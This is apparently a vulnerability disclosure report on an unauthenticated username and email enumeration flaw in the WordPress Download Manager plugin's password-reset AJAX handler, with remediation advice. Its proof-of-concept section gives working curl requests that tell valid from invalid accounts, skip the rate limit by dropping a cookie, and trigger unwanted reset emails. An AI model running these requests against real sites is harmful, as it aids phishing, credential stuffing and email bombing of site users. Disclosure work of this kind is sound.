=== SOFTWARE DETAILS ===

Type of Software: WordPress Plugin

Software Name: Download Manager

Software Slug: download-manager

Affected Version(s): <= 3.3.72

=== VULNERABILITY DETAILS ===

Description of Vulnerability

The plugin registers an unauthenticated AJAX handler for its custom password-reset flow (add_action("wp_ajax_nopriv_resetPassword", ...) in src/User/Login.php:34, implemented at src/User/Login.php:221). The resetPassword() handler resolves the submitted user_login (or email, when the value contains "@") via get_user_by() and returns "ok" when the account exists, or terminates with "error" when it does not:

    elseif (strpos($_POST['user_login'], '@')) {
        $user_data = get_user_by('email', trim(wp_unslash($_POST['user_login'])));
        if (empty($user_data)) die('error');
    } else {
        $login = trim($_POST['user_login']);
        $user_data = get_user_by('login', $login);
    }
    ...
    echo 'ok';

This makes it possible for unauthenticated attackers to distinguish valid usernames AND valid email addresses from invalid ones by comparing the two distinct responses — a user/email enumeration oracle. WordPress core's own retrieve_password() flow intentionally returns the same generic response for existing and non-existing accounts to prevent exactly this; the plugin's custom endpoint diverges from that baseline.

The handler includes a 60-second anti-flood throttle (Session::get('__reset_time')), but the throttle is bound to the plugin's __wpdm_client cookie (src/__/Session.php, cookie-based device ID). An attacker enumerates without any throttling by simply not sending the cookie (each cookie-less request is a fresh session, and the very first response for any tested username is never throttled). Additionally, every "ok" response triggers get_password_reset_key() plus an email dispatch to the account, so the same endpoint doubles as an unauthenticated email-bombing vector against any known account.

Verified dynamically on WordPress 6.7.1 with Download Manager 3.3.72: unauthenticated POST to admin-ajax.php with action=resetPassword returns "ok" for an existing username (admin) and an existing email, and "error" for non-existing values, with the throttle trivially bypassed by dropping the __wpdm_client cookie.

Vulnerability Type: User Enumeration (Username and Email Address Disclosure)

Impact Statement: Unauthenticated attackers can enumerate valid usernames and email addresses (and send unwanted password-reset emails to any confirmed account), aiding targeted phishing, credential-stuffing and social engineering against a site's users.

Common Weakness (CWE) Type: CWE-203 (Observable Behavioral Discrepancy) / CWE-204 (Observable Response Discrepancy)

Authentication Level Required: No Authentication

References to Affected Code:
- https://plugins.trac.wordpress.org/browser/download-manager/trunk/src/User/Login.php (resetPassword handler, line ~221-251: distinct 'ok'/'error' responses based on account existence; handler registered nopriv at line ~34)
- https://plugins.trac.wordpress.org/browser/download-manager/trunk/src/__/Session.php (cookie-based __wpdm_client device session used by the throttle)

References:
- https://wordpress.org/plugins/download-manager/
- CVE-2026-2571 (User Email Enumeration via 'user' Parameter, fixed in 3.3.50) is a DIFFERENT vulnerability: it requires Subscriber-level authentication and goes through the 'user' query parameter of a different endpoint. This finding is unauthenticated, goes through the password-reset AJAX action, and affects the current version 3.3.72.

=== PROOF OF CONCEPT ===

Prerequisites:
- WordPress 6.7.1, Download Manager 3.3.72 activated
- A known existing account (username "admin") and a non-existing username/email for the negative control

Step 1 — Enumerate an existing username (unauthenticated):
curl -s -X POST "http://TARGET/wp-admin/admin-ajax.php" \
  -d "action=resetPassword&__wpdm_reset_pass=1&user_login=admin"
Observed: ok   ← account exists

Step 2 — Negative control, non-existing username (unauthenticated):
curl -s -X POST "http://TARGET/wp-admin/admin-ajax.php" \
  -d "action=resetPassword&__wpdm_reset_pass=1&user_login=nobody123xyz"
Observed: error   ← account does not exist

Step 3 — Email enumeration (the handler also accepts emails):
curl -s -X POST "http://TARGET/wp-admin/admin-ajax.php" \
  -d "action=resetPassword&__wpdm_reset_pass=1&user_login=admin@example.test"
Observed: ok   ← email belongs to an account
curl -s -X POST "http://TARGET/wp-admin/admin-ajax.php" \
  -d "action=resetPassword&__wpdm_reset_pass=1&user_login=ghost@nowhere.tld"
Observed: error

Throttle bypass note: the plugin's 60-second throttle is keyed on the __wpdm_client cookie session; omitting the cookie (curl does by default) makes every enumeration request fresh — no rate limit is ever reached. Each "ok" also dispatches a password-reset email to the enumerated account.

Environment / Configuration Details: WordPress 6.7.1, PHP 8.2.34, MariaDB 11.5.2, Download Manager 3.3.72 default settings, single site, single administrator account used as the enumeration target. All requests performed without authentication and without cookies.

Certify PoC tested step-by-step: YES

Did you use AI? YES

=== OTHER DETAILS ===

Have you requested a CVE from another CNA? NO
Have you reported this to another vendor? NO
Terms agreement: YES

=== SUGGESTED REMEDIATION ===

1. Return the same generic response ("If that account exists, a reset link has been sent") regardless of whether get_user_by() finds a match, mirroring WordPress core's retrieve_password() behavior.
2. Bind the anti-flood throttle to a server-side identifier (e.g. hashed IP with a floor limit) in addition to the client cookie, so cookie-less requests are still throttled.
3. Consider only generating the reset key / sending the email for confirmed existing accounts without letting the response differ, and add generic error handling on the die() paths.
